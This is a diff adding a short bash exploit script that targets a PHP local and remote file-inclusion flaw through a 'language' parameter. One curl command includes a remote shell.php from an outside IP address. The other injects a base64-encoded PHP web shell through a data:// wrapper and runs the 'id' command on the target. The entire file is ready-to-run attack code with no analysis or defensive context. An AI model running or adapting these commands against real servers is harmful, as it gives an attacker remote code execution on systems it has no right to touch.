@@ -1,0 +1,3 @@
+#!/bin/bash
+curl -iX GET http://$1/login?language=http://10.1.20.202:2333/shell.php&cmd=10
+curl -iX GET http://$1/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
